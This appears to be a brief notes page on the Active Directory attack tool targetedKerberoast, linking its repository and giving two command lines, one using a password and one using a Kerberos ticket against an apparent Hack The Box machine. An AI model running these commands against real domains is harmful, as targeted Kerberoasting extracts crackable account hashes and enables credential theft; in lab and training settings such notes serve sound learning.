# targetedkerberoast

## Overview

https://github.com/ShutdownRepo/targetedKerberoast

## Usage

```shell
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

With a TGT:

```shell
export KRB5CCNAME=~/workspace/tmp/voleur/svc_ldap.ccache
faketime "$(ntpdate -q voleur.htb | awk '{print $1" "$2}')" python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```